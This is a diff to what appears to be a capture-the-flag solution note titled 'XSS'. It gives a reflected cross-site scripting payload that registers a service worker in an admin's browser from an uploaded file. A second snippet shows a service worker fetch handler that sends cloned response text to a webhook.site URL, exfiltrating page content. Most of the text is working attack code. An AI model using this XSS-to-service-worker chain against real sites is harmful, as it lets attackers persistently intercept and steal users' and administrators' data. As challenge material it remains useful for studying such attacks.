@@ -1,9 +1,11 @@
 # XSS
-Use the reflected xss in /play to run a script that add a service worker shared with the admin
+Use the reflected xss in /play to run a script from a file shared with the admin (allowed by the CSP).
+Use the XSS to register a service worker in the admin browser.
+
 ```
 <script>
-navigator.serviceWorker.register('http://localhost:5000/upload/2b56cf292bf342528333e58500f365bc');
-window.setTimeout(()=>document.location = 'http://localhost:5000/upload/ffffffffffffffffffffffffffffffff',500);
+navigator.serviceWorker.register('https://filesharing.m0lec.one/upload/e81c51506d9b4e4ca5d609ed0f6e4fe3');
+window.setTimeout(()=>document.location = 'https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff',500);
 </script>
 ```
 
@@ -30,7 +32,7 @@ self.addEventListener('fetch', (e) => {
 
 
         clone = anotherResponse.clone()
-        clone.text().then((x)=>fetch('https://webhook.site/658ad3a1-05d6-4e79-a8e8-15a46d2caf40/'+x).then((r)=>console.log(r)));
+        clone.text().then((x)=>fetch('https://webhook.site/9cf73d0f-160a-4f23-a986-70f1bc21b864/'+x).then((r)=>console.log(r)));
 
 
         console.log(new Map(anotherResponse.headers));
